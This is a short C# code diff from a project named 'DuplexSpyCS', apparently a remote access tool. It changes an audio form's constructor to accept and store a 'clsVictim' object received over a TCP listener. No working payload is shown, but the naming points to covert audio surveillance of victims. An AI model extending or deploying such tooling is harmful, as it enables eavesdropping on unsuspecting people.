@@ -39,9 +39,11 @@ namespace DuplexSpyCS
 
         private int nTimeout = 10000; //ms
 
-        public frmAudio()
+        public frmAudio(clsVictim victim)
         {
             InitializeComponent();
+
+            v = victim;
         }
 
         private void Received(clsTcpListener l, clsVictim v, string[] cmd)
